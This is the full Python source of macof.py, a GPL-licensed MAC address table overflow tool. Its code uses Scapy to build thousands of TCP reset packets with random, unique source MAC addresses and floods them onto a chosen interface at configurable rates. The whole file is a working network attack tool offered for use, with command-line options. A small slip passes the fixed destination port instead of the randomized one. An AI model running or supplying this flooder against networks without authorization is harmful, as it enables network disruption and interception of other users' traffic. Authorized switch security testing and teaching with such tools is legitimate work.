#! /usr/bin/env python
"""
Copyright 2017 WhiteWinterWolf (www.whitewinterwolf.com)

This file is part of macof.py.

macof.py is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

--------------------------------------------------------------------------------

macof.py is a MAC address table overflow tool.

The complete documentation is available in the macof.py(1) man page and on
<https://github.com/WhiteWinterWolf/macof.py>
"""

import argparse
import sys
from random import randrange
from scapy.all import sendp, sendpfast, Ether, IP, RandIP, RandMAC, TCP


DEFAULT_COUNT = 20000
DEFAULT_SPEED = 5000

DEFAULT_DIP = '0.0.0.0/0'
DEFAULT_DMAC = 'ff:ff:ff:ff:ff:ff'
DEFAULT_SIP = '0.0.0.0/0'
DEFAULT_SMAC = '*:*:*:*:*:*'

PORT_MIN = 32768
PORT_MAX = 60099

MAX_DUPES = 1000


def send(pkts, iface = None, loop = True, speed = DEFAULT_SPEED, wait = None):
	if wait is not None:
		if speed is not None:
			raise ValueError('Refresh speed and waiting time are mutually exclusive.')
		msg = "* Sending one packet every {0} milliseconds, press Ctrl+C to terminate."
		print(msg.format(wait))
		sendp(pkts, inter = float(wait) / 1000, iface=iface, loop=loop, verbose=False)
	elif loop is True:
		msg = "* Sending {0} packets per second, press Ctrl+C to terminate."
		print(msg.format(speed))
		# TODO: `tcpreplay` has no infinite loop feature and Scapy does not
		# report `tcpreplay` exit code or reason :( .
		# This value however should last several years for one second cycles.
		sendpfast(pkts, iface=iface, pps=speed, loop=999999999)
	else:
		msg = "* Sending {0} packets per second, looping {1} times."
		print(msg.format(speed, loop))
		sendpfast(pkts, iface=iface, pps=speed, loop=loop)


def macof(
	count = DEFAULT_COUNT,
	dip = DEFAULT_DIP,
	dmac = DEFAULT_DMAC,
	dport = None,
	fspeed = DEFAULT_SPEED,
	iface = None,
	loop = True,
	rspeed = None,
	sip = DEFAULT_SIP,
	smac = DEFAULT_SMAC,
	sport = None,
	wait = None,
):
	if count <= 0 or loop <= 0:
		print("Nothing to do.")
		return

	print("* Pre-generating {0} packets...".format(count))
	addresses = set()
	dport_rand = dport
	dupes = 0
	i = 0
	pkts = []
	sport_rand = sport
	while i < count:
		smac_rand = str(RandMAC(smac))

		# Ensure that the I/G bit remains unset.
		old = int(smac_rand[1], 16)
		new = old & 14
		if old != new:
			smac_rand = "{0}{1:x}{2}".format(smac_rand[0], new, smac_rand[2:])

		# Ensure source MAC address uniqueness
		if smac_rand not in addresses:
			addresses.add(smac_rand)
			i += 1

			if dport is None:
				dport_rand = randrange(PORT_MIN, PORT_MAX + 1)
			if sport is None:
				sport_rand = randrange(PORT_MIN, PORT_MAX + 1)

			pkts.append(Ether(src=smac_rand, dst=str(RandMAC(dmac)))/
				IP(src=str(RandIP(sip)), dst=str(RandIP(dip)))/
				TCP(sport=sport_rand, dport=dport, flags='R',
				options=[('Timestamp', (0, 0))]))
		else:
			dupes += 1
			if dupes > MAX_DUPES:
				raise ValueError("Failed to generate MAC addresses:"
					+ "mask to narrow for the number of addresses to generate.")
	addresses = None

	if rspeed or wait:
		send(pkts, iface=iface, loop=1, speed=fspeed)
		if loop is not True:
			loop -= 1
		if loop != 0:
			send(pkts, iface=iface, loop=loop, speed=rspeed, wait=wait)
	else:
		send(pkts, iface=iface, loop=loop, speed=fspeed)


def main():
	print("macof.py <https://www.whitewinterwolf.com/projects/>\n")

	parser = argparse.ArgumentParser(description="MAC address table overflow tool.")
	parser.add_argument('-c', '--count', type=int, default=DEFAULT_COUNT,
		help="Generate COUNT different MAC addresses and packets")
	parser.add_argument('-f', '--fspeed', metavar='PPS', type=int,
		default=DEFAULT_SPEED,
		help="Send PPS packets per second during the initial flooding phase")
	parser.add_argument('-i', '--iface',
		help="Output interface name")
	parser.add_argument('-l', '--loop', type=int, default=True,
		help="Send all packets LOOP times then exit")

	parser_refresh = parser.add_mutually_exclusive_group()
	parser_refresh.add_argument('-r', '--rspeed', metavar='PPS', type=int,
		help="Send PPS packets per second during the refresh phase")
	parser_refresh.add_argument('-w', '--wait', metavar='MSEC', type=int,
		help="Wait at least MSEC milliseconds between each packet sent during the refresh phase")

	parser_pkt = parser.add_argument_group("Packets creation options")
	# One-letter arguments are for compatibility with the historical macof.
	parser_pkt.add_argument('--dip', '-d', metavar='IP', default = DEFAULT_DIP,
		help="Destination IP address")
	parser_pkt.add_argument('--dmac', '-e', metavar='MAC', default=DEFAULT_DMAC,
		help="Destination MAC address")
	parser_pkt.add_argument('--dport',  '-y', metavar='PORT', type=int,
		help="Destination port number")
	parser_pkt.add_argument('--sip', '-s', metavar='IP', default = DEFAULT_SIP,
		help="Source IP address")
	parser_pkt.add_argument('--smac', metavar='MAC', default=DEFAULT_SMAC,
		help="Source MAC address")
	parser_pkt.add_argument('--sport', '-x', metavar='PORT', type=int,
		help="Source port number")

	args = parser.parse_args()
	try:
		macof(
			count = args.count,
			dip = args.dip,
			dmac = args.dmac,
			dport = args.dport,
			fspeed = args.fspeed,
			iface = args.iface,
			loop = args.loop,
			rspeed = args.rspeed,
			sip = args.sip,
			smac = args.smac,
			sport = args.sport,
			wait = args.wait,
		)
	except ValueError as e:
		print("ERROR: {0}".format(e))
		return 1
	return 0


if __name__ == '__main__':
	exit(main())
